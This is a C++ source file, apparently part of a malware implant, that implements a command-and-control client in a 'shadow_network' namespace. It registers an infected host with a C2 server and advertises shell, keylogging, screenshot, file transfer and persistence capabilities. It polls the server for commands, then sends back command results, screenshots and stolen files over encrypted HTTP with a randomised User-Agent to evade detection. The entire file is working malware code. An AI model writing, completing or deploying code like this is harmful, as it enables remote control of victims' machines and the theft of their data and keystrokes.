#include "network.hpp"
#include <json/json.h>
#include <iostream>
#include <sstream>
#include <chrono>
#include <thread>

namespace shadow_network {

size_t C2Client::WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string C2Client::random_ua() {
    const char* uas[] = {
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
    };
    return uas[rand() % 3];
}

C2Client::C2Client(const std::string& url, const std::string& pass) 
    : c2_url(url), passphrase(pass) {
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    srand(time(nullptr));
}

C2Client::~C2Client() {
    curl_easy_cleanup(curl);
    curl_global_cleanup();
}

bool C2Client::register_bot(const std::string& hostname, const std::string& username, 
                           const std::string& os_info) {
    // Generar bot_id aleatorio
    bot_id = shadow_crypto::random_string(8);
    
    Json::Value data;
    data["bot_id"] = bot_id;
    data["hostname"] = hostname;
    data["username"] = username;
    data["os"] = os_info;
    
    Json::Value caps(Json::arrayValue);
    caps.append("shell");
    caps.append("screenshot");
    caps.append("keylog");
    caps.append("download");
    caps.append("upload");
    caps.append("persist");
    caps.append("info");
    data["capabilities"] = caps;
    
    std::string json_str = data.toStyledString();
    std::string encrypted = shadow_crypto::encrypt(json_str, passphrase);
    
    std::string payload = "{\"data\":\"" + encrypted + "\"}";
    
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, ("User-Agent: " + random_ua()).c_str());
    
    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, (c2_url + "/c2/stealth/register").c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    
    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    
    if (res != CURLE_OK) return false;
    
    // Parsear respuesta
    Json::Reader reader;
    Json::Value root;
    if (!reader.parse(response, root)) return false;
    
    std::string resp_data = root["data"].asString();
    std::string decrypted = shadow_crypto::decrypt(resp_data, passphrase);
    
    if (!reader.parse(decrypted, root)) return false;
    bot_id = root["bot_id"].asString();
    
    return true;
}

std::string C2Client::check_commands() {
    std::string encrypted = shadow_crypto::encrypt("{}", passphrase);
    std::string payload = "{\"data\":\"" + encrypted + "\"}";
    
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, ("User-Agent: " + random_ua()).c_str());
    
    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, (c2_url + "/c2/stealth/check/" + bot_id).c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    
    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    
    if (res != CURLE_OK) return "";
    
    Json::Reader reader;
    Json::Value root;
    if (!reader.parse(response, root)) return "";
    
    std::string resp_data = root["data"].asString();
    return shadow_crypto::decrypt(resp_data, passphrase);
}

bool C2Client::send_result(int cmd_id, const std::string& result) {
    Json::Value data;
    data["cmd_id"] = cmd_id;
    data["result"] = result;
    
    std::string json_str = data.toStyledString();
    std::string encrypted = shadow_crypto::encrypt(json_str, passphrase);
    std::string payload = "{\"data\":\"" + encrypted + "\"}";
    
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, ("User-Agent: " + random_ua()).c_str());
    
    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, (c2_url + "/c2/stealth/result/" + bot_id).c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    
    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    
    return res == CURLE_OK;
}

bool C2Client::send_screenshot(const std::string& image_data) {
    Json::Value data;
    data["image_data"] = image_data;
    
    std::string json_str = data.toStyledString();
    std::string encrypted = shadow_crypto::encrypt(json_str, passphrase);
    std::string payload = "{\"data\":\"" + encrypted + "\"}";
    
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, ("User-Agent: " + random_ua()).c_str());
    
    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, (c2_url + "/c2/stealth/screenshot/" + bot_id).c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    
    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    
    return res == CURLE_OK;
}

bool C2Client::send_file(const std::string& filename, const std::string& file_data) {
    Json::Value data;
    data["filename"] = filename;
    data["file_data"] = file_data;
    
    std::string json_str = data.toStyledString();
    std::string encrypted = shadow_crypto::encrypt(json_str, passphrase);
    std::string payload = "{\"data\":\"" + encrypted + "\"}";
    
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, ("User-Agent: " + random_ua()).c_str());
    
    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, (c2_url + "/c2/stealth/file/" + bot_id).c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    
    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    
    return res == CURLE_OK;
}

} // namespace shadow_network
